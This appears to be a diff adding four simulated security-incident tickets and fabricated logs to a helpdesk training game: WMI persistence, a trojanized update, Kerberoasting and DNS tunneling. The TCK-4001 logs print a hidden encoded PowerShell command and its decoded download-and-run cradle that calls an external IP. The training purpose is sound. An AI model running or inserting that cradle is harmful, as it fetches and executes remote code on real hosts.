@@ -4807,6 +4807,10 @@ const TICKET_BANK = [
     reporter:'proxy-alerts@cedarcreek-ind.com (automated)',
     created:'2026-08-19 04:10', tags:['exfiltration','data-loss','incident'],
     desc:'The web proxy logged host ENG-14 uploading 6.8 GB of encrypted .7z archives to mega[.]nz-style storage between 03:50-04:08 — outside business hours and far above this host normal outbound baseline. The same host earlier had the DLP/USB alert (TCK-2005). Determine whether this is exfiltration tied to the broader incident or a separate event, decide whether to block the destination and isolate the host, and outline what leadership/legal notification may be required for potential data loss.' },
+  {"id": "TCK-4001", "tier": "Hard", "type": "Security", "defaultPriority": "P1", "title": "Host re-infects itself after the malware file was deleted", "reporter": "edr-alert@cedarcreek-ind.com (automated)", "created": "2026-09-15 09:20", "tags": ["persistence", "fileless", "wmi", "incident"], "desc": "EDR keeps alerting on host ENG-09 (user p.nguyen): powershell.exe is being launched by the WMI provider every ~30 minutes and at logon, and it beacons to an external IP. A technician already found and deleted the malware file (C:\\ProgramData\\upd\\svc.exe) on 09-14, but the alerts came right back and there is now no malware file on disk. Figure out why it keeps coming back, remove whatever is making it persist, and confirm the host is actually clean."},
+  {"id": "TCK-4002", "tier": "Hard", "type": "Security", "defaultPriority": "P1", "title": "Workstations beaconing after a third-party software auto-update", "reporter": "edr-alert@cedarcreek-ind.com (automated)", "created": "2026-09-22 11:05", "tags": ["supply-chain", "malware", "incident"], "desc": "Four engineering/sales workstations started beaconing to an unknown external IP within minutes of each other overnight. The only thing they have in common is that they all auto-updated the third-party tool \"NetScan Pro\" (vendor Orbit Labs) to version 4.2.1 around 02:14. The new binary is digitally signed and came through the normal update channel, so the first tech marked it a false positive. Determine whether this signed, vendor-delivered update is actually safe, scope how many hosts are affected, and lay out containment and recovery."},
+  {"id": "TCK-4003", "tier": "Hard", "type": "Security", "defaultPriority": "P1", "title": "Suspicious burst of Kerberos service-ticket requests (possible Kerberoasting)", "reporter": "siem-alert@cedarcreek-ind.com (automated)", "created": "2026-09-29 12:10", "tags": ["active-directory", "credential-access", "kerberoasting", "incident"], "desc": "The SIEM flagged an unusual pattern on the domain controller: the account r.castillo (SALES-06) requested Kerberos service tickets for eight different services in under a minute, all using the weak RC4 encryption. A few hours later the service account svc-sql logged on from SALES-06 — a workstation, not its own SQL server — and reached payroll data. There are no failed logons anywhere. Work out what happened to svc-sql, how, and what must be rotated and hardened across Active Directory."},
+  {"id": "TCK-4004", "tier": "Hard", "type": "Security", "defaultPriority": "P1", "title": "Abnormal volume of DNS queries from a single host", "reporter": "siem-alert@cedarcreek-ind.com (automated)", "created": "2026-10-06 07:15", "tags": ["exfiltration", "c2", "dns-tunneling", "incident"], "desc": "The SIEM shows host HR-05 (user e.foster) making an abnormal volume of DNS queries — over 14,000 today versus a normal ~200 — almost all to long, random-looking subdomains of a single recently registered domain. The web proxy and DLP show nothing unusual: no large uploads, no suspicious web traffic. Determine what this DNS activity really is, whether data is leaving the company, and how to shut it down and prevent it."},
 ];
 
 const TICKET_LOGS = {
@@ -8914,6 +8918,743 @@ const TICKET_LOGS = {
 "Different data set (Halvorsen only), different account (t.becker), 15:11 the day before"
 ]
 ]
+}
+],
+"TCK-4001": [
+{
+"name": "EDR Process Telemetry — ENG-09",
+"type": "table",
+"guide": "Process activity on ENG-09 (user p.nguyen). \"Parent -> Child\" shows what launched what. A tech already deleted the malware file once on 09-14; note what keeps happening AFTER that. powershell.exe launched by WmiPrvSE.exe (the WMI provider host) almost never happens from normal software.",
+"cols": [
+"Time",
+"Parent -> Child",
+"Command / Detail",
+"EDR Action"
+],
+"rows": [
+[
+"2026-09-14 15:02:11",
+"explorer.exe -> svc.exe",
+"C:\\ProgramData\\upd\\svc.exe (unsigned)",
+"Quarantined (file deleted by tech)"
+],
+[
+"2026-09-15 08:30:04",
+"svchost.exe -> WmiPrvSE.exe",
+"WMI consumer fired on logon",
+"Observed"
+],
+[
+"2026-09-15 08:30:05",
+"WmiPrvSE.exe -> powershell.exe",
+"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQ...<truncated>",
+"Alert — suspicious parent"
+],
+[
+"2026-09-15 08:30:07",
+"powershell.exe -> (network)",
+"TLS connect 193.149.176.40:443 (no SNI)",
+"Alert — rare external IP"
+],
+[
+"2026-09-15 09:00:06",
+"WmiPrvSE.exe -> powershell.exe",
+"same encoded command (fires ~every 30 min)",
+"Alert"
+],
+[
+"2026-09-15 09:00:09",
+"powershell.exe -> (network)",
+"TLS connect 193.149.176.40:443, 2.1 KB out / 0.4 KB in",
+"Alert — beacon pattern"
+],
+[
+"2026-09-15 09:12:40",
+"explorer.exe -> cmd.exe",
+"dir C:\\ProgramData\\upd  (tech checking — folder now empty)",
+"Observed"
+],
+[
+"2026-09-15 09:30:05",
+"WmiPrvSE.exe -> powershell.exe",
+"same encoded command — STILL running with no file on disk",
+"Alert"
+],
+[
+"2026-09-15 10:00:05",
+"WmiPrvSE.exe -> powershell.exe",
+"same encoded command",
+"Alert"
+]
+]
+},
+{
+"name": "Persistence / Autoruns Scan — ENG-09",
+"type": "table",
+"guide": "Everything configured to run automatically. WMI Event Subscriptions are a favorite hiding spot because they do not show up in normal startup folders or the registry Run keys, and they survive reboots. A subscription is three linked objects: an __EventFilter (the trigger), a CommandLineEventConsumer (the action), and a __FilterToConsumerBinding (the link). Remove all three.",
+"cols": [
+"Type",
+"Name",
+"Trigger / Action",
+"Signed?"
+],
+"rows": [
+[
+"WMI __EventFilter",
+"Win32Updater",
+"Fires on user logon and every 1800 s (system uptime query)",
+"n/a"
+],
+[
+"WMI CommandLineEventConsumer",
+"Win32UpdaterConsumer",
+"Runs: powershell.exe -nop -w hidden -enc SQBFAFgA... (IEX downloader)",
+"n/a"
+],
+[
+"WMI __FilterToConsumerBinding",
+"Win32Updater -> Win32UpdaterConsumer",
+"Links the filter to the consumer",
+"n/a"
+],
+[
+"Scheduled Task",
+"\\Microsoft\\Windows\\EdgeUpdate\\MicrosoftEdgeUpdateTaskCore",
+"At logon: powershell -enc ... (backup persistence)",
+"No (task created 09-13, not by MS)"
+],
+[
+"Run key",
+"HKCU\\...\\Run\\OneDrive",
+"C:\\Users\\p.nguyen\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+"Yes (legitimate — leave it)"
+],
+[
+"Scheduled Task",
+"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+"Weekly defrag",
+"Yes (legitimate)"
+]
+]
+},
+{
+"name": "PowerShell Script Block Log — ENG-09 (decoded)",
+"type": "kv",
+"guide": "Windows logged the PowerShell script block (Event 4104) even though the command was run encoded and hidden. This is what the -enc blob decodes to. It is a downloader (fileless): it pulls the next stage straight into memory, which is why there is no second file on disk.",
+"rows": [
+[
+"Decoded command",
+"IEX (New-Object Net.WebClient).DownloadString(\"https://193.149.176.40/a\")  [download-and-run, in memory]"
+],
+[
+"What it does",
+"Downloads stage 2 into memory and runs it — nothing is written to disk, so file-based AV and \"delete the EXE\" do not stop it"
+],
+[
+"Callback",
+"193.149.176.40:443 — no domain, no SNI, not in company allow-list"
+],
+[
+"Why it keeps coming back",
+"The WMI consumer and the scheduled task re-run this on every logon and every 30 minutes, with or without svc.exe present"
+]
+]
+}
+],
+"TCK-4002": [
+{
+"name": "Software Update / Deployment Log",
+"type": "table",
+"guide": "The patch-management system records every automatic update it pushed. \"NetScan Pro\" is a network-diagnostics tool from vendor Orbit Labs that auto-updates. Note which hosts got v4.2.1, and that the version jumped on its own overnight.",
+"cols": [
+"Time",
+"Host",
+"Product",
+"Old -> New",
+"Source",
+"Result"
+],
+"rows": [
+[
+"2026-09-22 02:14:03",
+"ENG-03",
+"NetScan Pro",
+"4.1.6 -> 4.2.1",
+"update.orbitlabs-cdn.com",
+"Installed (auto)"
+],
+[
+"2026-09-22 02:14:20",
+"ENG-09",
+"NetScan Pro",
+"4.1.6 -> 4.2.1",
+"update.orbitlabs-cdn.com",
+"Installed (auto)"
+],
+[
+"2026-09-22 02:15:02",
+"ENG-11",
+"NetScan Pro",
+"4.1.6 -> 4.2.1",
+"update.orbitlabs-cdn.com",
+"Installed (auto)"
+],
+[
+"2026-09-22 02:15:51",
+"SALES-06",
+"NetScan Pro",
+"4.1.6 -> 4.2.1",
+"update.orbitlabs-cdn.com",
+"Installed (auto)"
+],
+[
+"2026-09-22 09:40:10",
+"FINANCE-03",
+"Adobe Reader",
+"2026.001 -> 2026.002",
+"Internal WSUS",
+"Installed (approved)"
+]
+]
+},
+{
+"name": "EDR — Behavior After the Update",
+"type": "table",
+"guide": "What netscan.exe did AFTER the 4.2.1 update, on every host that received it. Before 4.2.1 this tool never spawned these processes or made these connections. The beacon has long, jittered intervals (every ~4 hours) to blend in.",
+"cols": [
+"Time",
+"Host",
+"Process",
+"Detail"
+],
+"rows": [
+[
+"2026-09-22 02:16:40",
+"ENG-03",
+"netscan.exe -> rundll32.exe",
+"Loaded C:\\Users\\Public\\ns_helper.dll (new, unsigned)"
+],
+[
+"2026-09-22 02:16:45",
+"ENG-03",
+"rundll32.exe",
+"DNS: 7f3a9c.cfg.cloud-telemetry.io  (algorithmic subdomain)"
+],
+[
+"2026-09-22 06:34:12",
+"ENG-03",
+"rundll32.exe",
+"TLS beacon to 46.102.113.7:443, 1.8 KB out (jittered ~4h)"
+],
+[
+"2026-09-22 02:17:30",
+"ENG-09",
+"netscan.exe -> rundll32.exe",
+"Loaded ns_helper.dll; DNS b14e02.cfg.cloud-telemetry.io"
+],
+[
+"2026-09-22 10:41:55",
+"ENG-11",
+"rundll32.exe",
+"TLS beacon to 46.102.113.7:443"
+],
+[
+"2026-09-22 11:02:19",
+"SALES-06",
+"rundll32.exe",
+"TLS beacon to 46.102.113.7:443"
+]
+]
+},
+{
+"name": "File Reputation & Code Signing — netscan.exe 4.2.1",
+"type": "kv",
+"guide": "Details on the 4.2.1 binary. A valid digital signature only proves the file was not altered AFTER signing — it does NOT prove the vendor is trustworthy or that their build system was not compromised. Compare the signing details to the previous trusted version.",
+"rows": [
+[
+"Signature",
+"Digitally signed, \"Orbit Labs LLC\" — shows as Valid"
+],
+[
+"Signing certificate",
+"Issued 2026-09-19 (3 days before the update); thumbprint DIFFERS from the 4.1.6 certificate"
+],
+[
+"Previous version 4.1.6",
+"Signed with the long-standing Orbit Labs cert (issued 2023), thumbprint on file"
+],
+[
+"Added component",
+"ns_helper.dll — not present in 4.1.6, unsigned, not documented in release notes"
+],
+[
+"VirusTotal",
+"3 / 72 engines (generic/heuristic) — low, because the file is freshly signed"
+],
+[
+"Hash vs vendor",
+"Does NOT match the SHA-256 Orbit Labs later published for a clean 4.2.1"
+]
+]
+},
+{
+"name": "Vendor Security Advisory — Orbit Labs OL-2026-004",
+"type": "text",
+"guide": "Posted by the vendor two days after the update went out.",
+"text": "Orbit Labs Security Advisory OL-2026-004 (2026-09-24): Orbit Labs has confirmed that an attacker gained access to our software build and update-distribution infrastructure and published trojanized builds of NetScan Pro. Affected versions: 4.2.0, 4.2.1, 4.2.2. The malicious builds were signed with a certificate the attacker generated after compromising a build server and include an additional component (ns_helper.dll) that contacts attacker infrastructure. Customers should: (1) treat any host that installed 4.2.0-4.2.2 as compromised; (2) isolate and rebuild those hosts; (3) block update.orbitlabs-cdn.com and the indicators in Appendix A; (4) downgrade to 4.1.6 or install the verified clean 4.2.3 (SHA-256 published below) only from our primary portal; (5) rotate credentials used on affected hosts. We have revoked the fraudulent signing certificate."
+}
+],
+"TCK-4003": [
+{
+"name": "DC Kerberos Service-Ticket Requests (Event 4769)",
+"type": "table",
+"guide": "Every time a user asks to use a service, the domain controller logs a 4769 for that service name (SPN). Normal users request a few, spread out, usually AES (0x12). Watch for ONE account requesting MANY different SPNs in a short burst, especially with RC4 (0x17): RC4 tickets are the easiest to crack offline. That pattern is Kerberoasting.",
+"cols": [
+"Time",
+"Account",
+"Host",
+"Service (SPN) requested",
+"Encryption",
+"Result"
+],
+"rows": [
+[
+"2026-09-29 07:57:58",
+"a.singh",
+"FINANCE-03",
+"MSSQLSvc/app01 or host/...",
+"0x12 (AES256)",
+"0x0"
+],
+[
+"2026-09-29 08:21:14",
+"m.hall",
+"SALES-11",
+"MSSQLSvc/app01 or host/...",
+"0x12 (AES256)",
+"0x0"
+],
+[
+"2026-09-29 08:35:17",
+"j.owens",
+"HR-02",
+"MSSQLSvc/app01 or host/...",
+"0x12 (AES256)",
+"0x0"
+],
+[
+"2026-09-29 08:36:57",
+"k.tran",
+"MKT-04",
+"MSSQLSvc/app01 or host/...",
+"0x12 (AES256)",
+"0x0"
+],
+[
+"2026-09-29 08:41:10",
+"r.castillo",
+"SALES-06",
+"MSSQLSvc/sql01.cedarcreek.local:1433",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:14",
+"r.castillo",
+"SALES-06",
+"HTTP/intranet.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:18",
+"r.castillo",
+"SALES-06",
+"MSSQLSvc/app01.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:22",
+"r.castillo",
+"SALES-06",
+"CIFS/fileserver.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:26",
+"r.castillo",
+"SALES-06",
+"FTP/transfer.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:30",
+"r.castillo",
+"SALES-06",
+"HTTP/reports.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:34",
+"r.castillo",
+"SALES-06",
+"MSSQLSvc/hr-sql.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+],
+[
+"2026-09-29 08:41:38",
+"r.castillo",
+"SALES-06",
+"TERMSRV/vdi01.cedarcreek.local",
+"0x17 (RC4-HMAC)",
+"0x0"
+]
+]
+},
+{
+"name": "Service Account Inventory",
+"type": "kv",
+"guide": "Details on svc-sql, the account whose SPN was requested in the burst. A service account with a weak, old, never-expiring password and an SPN is exactly what Kerberoasting targets — the attacker cracks the ticket offline, so no failed logons ever appear.",
+"rows": [
+[
+"Account",
+"CEDARCREEK\\svc-sql (service account, has SPN MSSQLSvc/sql01)"
+],
+[
+"Password last set",
+"2021-03-02 (never changed); \"password never expires\" = true"
+],
+[
+"Password policy",
+"Set manually years ago; short; not a managed/random password"
+],
+[
+"Group membership",
+"Member of a privileged SQL admins group; local admin on two servers"
+],
+[
+"Encryption types allowed",
+"RC4 still enabled (allows the weak 0x17 tickets)"
+]
+]
+},
+{
+"name": "svc-sql Usage After the Burst",
+"type": "table",
+"guide": "How svc-sql was used after the 08:41 ticket burst. A service account should only ever authenticate FROM its own server(s). A svc-sql interactive/remote logon from a sales workstation is a strong sign the password was cracked and is now being used by the attacker.",
+"cols": [
+"Time",
+"Account",
+"From Host",
+"Event",
+"Detail"
+],
+"rows": [
+[
+"2026-09-29 11:18:02",
+"svc-sql",
+"SALES-06 (10.20.16.26)",
+"4624 Logon type 3",
+"Network logon — NOT from sql01"
+],
+[
+"2026-09-29 11:19:40",
+"svc-sql",
+"SALES-06",
+"SQL login",
+"Connected to sql01 master DB"
+],
+[
+"2026-09-29 11:26:11",
+"svc-sql",
+"SALES-06",
+"File access",
+"Opened \\\\fileserver\\Finance\\Payroll (outside its normal scope)"
+],
+[
+"2026-09-29 11:41:03",
+"svc-sql",
+"SALES-06",
+"4672",
+"Admin rights assigned to new logon"
+]
+]
+}
+],
+"TCK-4004": [
+{
+"name": "DNS Server Query Log (06:00-08:00)",
+"type": "table",
+"guide": "Every DNS lookup internal hosts made. Normal lookups are short, repeated names (office365, windowsupdate). DNS tunneling hides data INSIDE the names being looked up: many unique, long, random-looking subdomains of ONE parent domain, often TXT records. The firewall and web proxy never see it because it rides UDP/53, which is almost always allowed out.",
+"cols": [
+"Time",
+"Source",
+"Type",
+"Query",
+"Result"
+],
+"rows": [
+[
+"2026-10-06 06:05:09",
+"HR-05 10.20.18.15",
+"TXT",
+"070e44a58131d962bf40334518a705d19c.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:06:59",
+"HR-05 10.20.18.15",
+"A",
+"2d0fc70242ecd800ea542134d2d377dbede286.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:07:37",
+"HR-05 10.20.18.15",
+"A",
+"cac9e2656075f7274fa37c3e6fcb8b05.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:08:51",
+"HR-05 10.20.18.15",
+"TXT",
+"45d21b6c9948c738d9cf73fe7f5f927ffc106d.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:09:19",
+"HR-05 10.20.18.15",
+"TXT",
+"b5d075c40c07807c51a5f216b58f2e093.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:10:51",
+"HR-05 10.20.18.15",
+"TXT",
+"2aeb522bcb5e585220a9aa061d30488b5fcf8857.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:11:35",
+"HR-05 10.20.18.15",
+"TXT",
+"816a99898922894c0b7bded71619b05fd2f13ce2.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:12:22",
+"HR-05 10.20.18.15",
+"TXT",
+"028edc8142ccbf6b2596588ff27750228a754845.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:13:09",
+"HR-05 10.20.18.15",
+"TXT",
+"f2223b4268b72492525e768f692bdfbefbc9430e.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:14:52",
+"HR-05 10.20.18.15",
+"TXT",
+"fe4fa72b239987a60ed2e73d4c430e76da.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:15:12",
+"HR-05 10.20.18.15",
+"A",
+"de98c1d96b551ac1f1fd85e4ed37f02.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:16:43",
+"HR-05 10.20.18.15",
+"A",
+"11b1bea8ab72600dc02e405fc1324e66.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:17:27",
+"HR-05 10.20.18.15",
+"TXT",
+"c45125103ca28815b8e3eeb79e021.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:18:33",
+"HR-05 10.20.18.15",
+"A",
+"da68080e4857e55f6224846e38971e5ae9d13d.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:19:33",
+"HR-05 10.20.18.15",
+"TXT",
+"800b08eaa66a2b76146c8a6b5c29ef80c1b3ed.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:20:53",
+"HR-05 10.20.18.15",
+"A",
+"2c1392428666dfe3838747dbf6c443682cb0c.d.data-sync-cdn.net",
+"NOERROR"
+],
+[
+"2026-10-06 06:27:22",
+"ENG-09 10.20.30.9",
+"A",
+"teams.microsoft.com",
+"NOERROR"
+],
+[
+"2026-10-06 06:37:57",
+"ENG-09 10.20.30.9",
+"A",
+"fileserver.cedarcreek.local",
+"NOERROR"
+],
+[
+"2026-10-06 07:05:19",
+"ENG-03 10.20.30.3",
+"A",
+"clients.google.com",
+"NOERROR"
+],
+[
+"2026-10-06 07:14:28",
+"SALES-11 10.20.16.31",
+"A",
+"outlook.office365.com",
+"NOERROR"
+],
+[
+"2026-10-06 07:22:37",
+"ENG-03 10.20.30.3",
+"A",
+"fileserver.cedarcreek.local",
+"NOERROR"
+],
+[
+"2026-10-06 07:29:32",
+"ACCT-05 10.20.14.55",
+"A",
+"login.microsoftonline.com",
+"NOERROR"
+],
+[
+"2026-10-06 07:35:56",
+"EXEC-01 10.20.10.11",
+"A",
+"edge.microsoft.com",
+"NOERROR"
+],
+[
+"2026-10-06 07:43:24",
+"HR-05 10.20.18.15",
+"A",
+"fileserver.cedarcreek.local",
+"NOERROR"
+],
+[
+"2026-10-06 07:47:56",
+"FINANCE-07 10.20.14.37",
+"A",
+"fileserver.cedarcreek.local",
+"NOERROR"
+],
+[
+"2026-10-06 07:48:05",
+"FINANCE-07 10.20.14.37",
+"A",
+"teams.microsoft.com",
+"NOERROR"
+]
+]
+},
+{
+"name": "DNS Volume Baseline — HR-05",
+"type": "kv",
+"guide": "How unusual HR-05 traffic is today versus normal. One host sending thousands of lookups to a single, brand-new domain with long high-entropy labels is the tell.",
+"rows": [
+[
+"HR-05 normal DNS/day",
+"~200 lookups"
+],
+[
+"HR-05 today",
+"14,300+ lookups and climbing"
+],
+[
+"Share to one parent domain",
+"99% to *.d.data-sync-cdn.net"
+],
+[
+"Average label length",
+"34 chars, high entropy (looks random) — normal names are short words"
+],
+[
+"Record types",
+"Mostly TXT and A (TXT carries more data back — common in tunneling)"
+],
+[
+"Domain age",
+"data-sync-cdn.net registered 11 days ago; not on any company allow-list"
+],
+[
+"Web proxy / DLP",
+"Nothing — no HTTP upload, no large file transfer to catch"
+]
+]
+},
+{
+"name": "EDR — HR-05",
+"type": "table",
+"guide": "What on HR-05 is making the DNS queries, and how it got there.",
+"cols": [
+"Time",
+"Process",
+"Detail"
+],
+"rows": [
+[
+"2026-10-05 16:52:10",
+"OUTLOOK.EXE -> WINWORD.EXE",
+"Opened attachment Invoice_Sept.docm (macro-enabled) from email"
+],
+[
+"2026-10-05 16:52:44",
+"WINWORD.EXE -> powershell.exe",
+"Macro dropped C:\\Users\\e.foster\\AppData\\Roaming\\onedrive-sync.exe"
+],
+[
+"2026-10-06 06:05:02",
+"onedrive-sync.exe",
+"Began continuous DNS queries to *.d.data-sync-cdn.net"
+],
+[
+"2026-10-06 06:05-08:00",
+"onedrive-sync.exe",
+"Only outbound activity is UDP/53 — no HTTP, no TLS to the internet"
+]
+]
+},
+{
+"name": "How DNS Tunneling Works (reference)",
+"type": "text",
+"guide": "Background to help you read the logs.",
+"text": "In DNS tunneling, malware encodes small chunks of data into the subdomain part of a DNS query (for example <base32-of-data>.d.attacker.com) and sends it to the attacker-controlled authoritative name server for that domain. The server decodes the data and can answer back inside a TXT or A record, giving a two-way covert channel used for command-and-control and slow data exfiltration. It evades web proxies, firewalls and DLP because those usually allow outbound DNS (UDP/53) and do not inspect the contents of the names. Detection signals: a large volume of DNS from one host, many unique high-entropy subdomains under a single parent domain, a high share of TXT records, and a newly registered domain. It is slow, so a steady stream over hours is normal for this technique."
 }
 ]
 };
